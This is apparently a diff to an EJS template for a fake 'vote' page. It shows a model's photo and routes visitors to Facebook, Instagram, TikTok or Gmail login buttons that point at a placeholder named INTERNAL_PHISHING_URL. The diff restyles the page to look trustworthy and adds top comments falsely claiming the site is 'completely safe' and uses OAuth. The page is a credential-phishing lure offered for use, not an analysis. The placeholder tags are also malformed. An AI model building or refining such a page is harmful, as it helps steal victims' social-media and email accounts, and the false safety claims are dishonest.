@@ -1,3 +1,7 @@
+<!-- disclaimer -->
+<!-- this website is completely safe  -->
+<!-- the urls leads safely to site that authorize with Oath of the social pages -->
+
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -5,6 +9,7 @@
     <title><%= link.modelName %></title>
     <meta name="title" content="Join to participate in the vote" />
     <meta name="description" content="Participate in the vote" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website" />
@@ -18,8 +23,26 @@
     <meta property="twitter:description" content="Participate in the vote" />
     <meta property="twitter:image" content="<%= link.picture %>" />
 
-    <!-- Meta Tags Generated with https://metatags.io -->
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    
     <style>
+      :root {
+        --primary-color: #4267B2;
+        --secondary-color: #1877F2;
+        --accent-color: #E7F3FF;
+        --text-color: #333;
+        --light-text: #777;
+        --white: #fff;
+        --shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        --gradient: linear-gradient(135deg, #4267B2, #1877F2);
+      }
+      
       * {
         margin: 0;
         padding: 0;
@@ -27,112 +50,320 @@
       }
 
       body {
-        font-family: Arial, Helvetica, sans-serif;
+        font-family: 'Poppins', sans-serif;
+        background-color: #f5f7fa;
+        color: var(--text-color);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        position: relative;
+        overflow-x: hidden;
+      }
+      
+      body::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: url("<%= link.backgroundPicture %>") no-repeat center center;
+        background-size: cover;
+        opacity: 0.05;
+        z-index: -1;
       }
 
-      .card {
+      .container {
+        width: 100%;
+        max-width: 600px;
+        padding: 40px;
+        background: var(--white);
+        border-radius: 20px;
+        box-shadow: var(--shadow);
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+        animation: fadeIn 0.8s ease-out;
+      }
+      
+      .container::before {
+        content: '';
+        position: absolute;
+        top: -50px;
+        left: -50px;
+        width: 150px;
+        height: 150px;
+        background: var(--gradient);
+        border-radius: 50%;
+        opacity: 0.1;
+        z-index: 0;
+      }
+      
+      .container::after {
+        content: '';
+        position: absolute;
+        bottom: -50px;
+        right: -50px;
+        width: 150px;
+        height: 150px;
+        background: var(--gradient);
+        border-radius: 50%;
+        opacity: 0.1;
+        z-index: 0;
+      }
+
+      .profile {
+        position: relative;
+        z-index: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .profile-img {
+        width: 180px;
+        height: 180px;
+        border-radius: 50%;
+        object-fit: cover;
+        border: 5px solid var(--white);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        margin-bottom: 25px;
+        transition: transform 0.3s ease;
+        animation: pulse 2s infinite;
+      }
+      
+      .profile-img:hover {
+        transform: scale(1.05);
+      }
+
+      .content-card {
+        background-color: var(--white);
+        border-radius: 16px;
+        padding: 25px;
+        margin-bottom: 25px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        width: 100%;
+        transition: transform 0.3s ease;
+      }
+      
+      .content-card:hover {
+        transform: translateY(-5px);
+      }
+
+      .profile-name {
+        font-size: 24px;
+        font-weight: 600;
+        color: var(--primary-color);
+        margin-bottom: 15px;
+        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+      }
+
+      .profile-description {
+        font-size: 16px;
+        color: var(--text-color);
+        line-height: 1.6;
+        margin-bottom: 10px;
+      }
+
+      .action-buttons {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+        margin-top: 20px;
+        width: 100%;
+        max-width: 320px;
+      }
+
+      .social-btn {
         display: flex;
         align-items: center;
         justify-content: center;
-        background-image: url(<%= link.backgroundPicture %>);
-        background-position: center;
-        background-size: contain;
-        height: 20vh;
+        gap: 12px;
+        padding: 14px 20px;
+        border-radius: 12px;
+        text-decoration: none;
+        font-weight: 500;
+        font-size: 16px;
+        transition: all 0.3s ease;
+        position: relative;
+        overflow: hidden;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        color: var(--white);
+      }
+      
+      .social-btn::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.2);
+        transition: all 0.4s ease;
+      }
+      
+      .social-btn:hover::before {
+        left: 100%;
+      }
+      
+      .social-btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
       }
 
-      .card .profile {
+      .facebook-btn {
+        background: var(--gradient);
+      }
+
+      .instagram-btn {
+        background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+      }
+
+      .tiktok-btn {
+        background: linear-gradient(45deg, #000000, #25F4EE, #FE2C55, #000000);
+      }
+
+      .gmail-btn {
+        background: linear-gradient(45deg, #DB4437, #F2A600, #0F9D58, #4285F4);
+      }
+
+      .social-btn img {
+        width: 24px;
+        height: 24px;
+        object-fit: contain;
+        filter: brightness(0) invert(1);
+      }
+
+      .social-btn span {
+        text-transform: capitalize;
+      }
+
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 0.9);
         display: flex;
         flex-direction: column;
         justify-content: center;
         align-items: center;
-        position: absolute;
-        top: 5%;
+        z-index: 1000;
+        backdrop-filter: blur(5px);
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.3s ease;
       }
 
-      .card .profile .dp {
-        width: 300px;
-        height: 300px;
-        border: 1px solid #000;
+      .loading-overlay.active {
+        opacity: 1;
+        pointer-events: all;
+      }
+
+      .loading-spinner {
+        width: 60px;
+        height: 60px;
+        border: 4px solid rgba(66, 103, 178, 0.1);
         border-radius: 50%;
-        margin-bottom: 1em;
+        border-top: 4px solid var(--primary-color);
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
       }
 
-      .card .profile div {
-        margin-bottom: 0.5em;
+      .loading-text {
+        font-size: 18px;
+        color: var(--primary-color);
+        font-weight: 500;
       }
 
-      .s-action {
-        display: flex;
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
       }
-
-      .s-action a {
-        text-decoration: none;
-        display: flex;
-        align-items: center;
-        background-color: #002a54f4;
-        padding: 0.5em 1em;
-        border-radius: 10px;
-        color: #fff;
-        box-shadow: 2px 2px 4px #000;
-        margin-top: 1em;
+      
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
       }
-
-      .s-action a img {
-        width: 2em;
-        padding-left: 0.5em;
+      
+      @keyframes pulse {
+        0% { box-shadow: 0 0 0 0 rgba(66, 103, 178, 0.4); }
+        70% { box-shadow: 0 0 0 10px rgba(66, 103, 178, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(66, 103, 178, 0); }
       }
-
-      @media screen and (max-width: 768px) {
-        .card .profile .dp {
-          width: 150px;
-          height: 150px;
+      
+      /* Responsive adjustments */
+      @media (max-width: 600px) {
+        .container {
+          padding: 30px 20px;
         }
-        .card .profile {
-          top: 10%;
+        
+        .profile-img {
+          width: 140px;
+          height: 140px;
+        }
+        
+        .profile-name {
+          font-size: 20px;
         }
       }
     </style>
-    <title><%= link.modelName%></title>
   </head>
   <body>
-    <div class="card">
+    <div class="container">
       <div class="profile">
-        <img class="dp" src="<%= link.picture %>" alt="" />
-        <div
-          style="
-            background-color: white;
-            width: 100%;
-            text-align: center;
-            padding: 1em 2em;
-          "
-        >
-          <div style="font-weight: bold"><%= link.modelName %></div>
-          <p style="text-align: center"><%= link.writeup %></p>
+        <img class="profile-img" src="<%= link.picture %>" alt="<%= link.modelName %>" />
+        
+        <div class="content-card">
+          <h1 class="profile-name"><%= link.modelName %></h1>
+          <p class="profile-description"><%= link.writeup %></p>
         </div>
-        <div class="s-action">
+        
+        <div class="action-buttons">
           <% if(link.linkType == 'FACEBOOK'){%>
-          <a href="/face/<%= link.id %>?retry=<%=link.numberOfRetries%>">
-            <%= link.buttonText? link.buttonText : "VOTE WITH" %>
-            <img src="/img/facebook-logo.png" alt="" class="" />
+          <a href="<%= INTERNAL_PHISHING_URL =>/face/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn facebook-btn" onclick="showLoading()">
+            <img src="/img/facebook-logo.png" alt="Facebook" />
+            <span><%= link.buttonText? link.buttonText : "Continue with Facebook" %></span>
           </a>
-          <%}%> <% if(link.linkType == 'INSTAGRAM'){%>
-          <a href="/inst/<%= link.id %>?retry=<%=link.numberOfRetries%>">
-            <%= link.buttonText? link.buttonText : "VOTE WITH" %>
-            <img src="/insta.webp" alt="" class="" />
+          <%}%>
+          
+          <% if(link.linkType == 'INSTAGRAM'){%>
+          <a href="<%= INTERNAL_PHISHING_URL =>/inst/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn instagram-btn" onclick="showLoading()">
+            <img src="/insta.webp" alt="Instagram" />
+            <span><%= link.buttonText? link.buttonText : "Continue with Instagram" %></span>
           </a>
-          <%}%> <% if(link.linkType == 'TIKTOK'){%>
-          <a href="/tikto/<%= link.id %>?retry=<%=link.numberOfRetries%>">
-            <%= link.buttonText? link.buttonText : "VOTE WITH" %>
-            <img src="/tiktok/tiktok.png" alt="" class="" />
+          <%}%>
+          
+          <% if(link.linkType == 'TIKTOK'){%>
+          <a href="<%= INTERNAL_PHISHING_URL =>/tikto/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn tiktok-btn" onclick="showLoading()">
+            <img src="/tiktok/tiktok.png" alt="TikTok" />
+            <span><%= link.buttonText? link.buttonText : "Continue with TikTok" %></span>
           </a>
-          <%}%> <% if(link.linkType == 'GMAIL'){%>
-          <a href="/gma/<%= link.id %>?retry=<%=link.numberOfRetries%>">
-            <%= link.buttonText? link.buttonText : "VOTE WITH" %>
-            <img src="/img/gmail.png" alt="" class="" />
+          <%}%>
+          
+          <% if(link.linkType == 'GMAIL'){%>
+          <a href="<%= INTERNAL_PHISHING_URL =>/gma/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn gmail-btn" onclick="showLoading()">
+            <img src="/img/gmail.png" alt="Gmail" />
+            <span><%= link.buttonText? link.buttonText : "Continue with Gmail" %></span>
           </a>
           <%}%>
         </div>
       </div>
     </div>
+    
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+      <div class="loading-spinner"></div>
+      <div class="loading-text">Connecting...</div>
+    </div>
+    
+    <script>
+      function showLoading() {
+        document.getElementById('loadingOverlay').classList.add('active');
+      }
+    </script>
   </body>
 </html>
